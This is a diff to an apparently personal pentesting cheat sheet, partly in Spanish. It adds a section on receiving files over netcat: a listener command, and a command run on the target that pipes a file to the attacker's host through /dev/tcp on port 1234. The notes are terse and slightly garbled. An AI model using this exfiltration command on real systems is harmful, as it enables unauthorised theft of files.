@@ -8,6 +8,15 @@
             (apt install rlwrap)
 
 
+
+*** *** recibir archivos via netcat nc
+
+		::: nc -nlvp 1234 > File_Targed.test
+
+		targed::: cat < File_Targed > /dev/tcp/$(mvnb --vpn)/1234
+		trgd:::
+
+
 google:: netcat windows download
          https://www.eternallybored.org    (Small update: netcat_?.??  <<--!! <3)
 
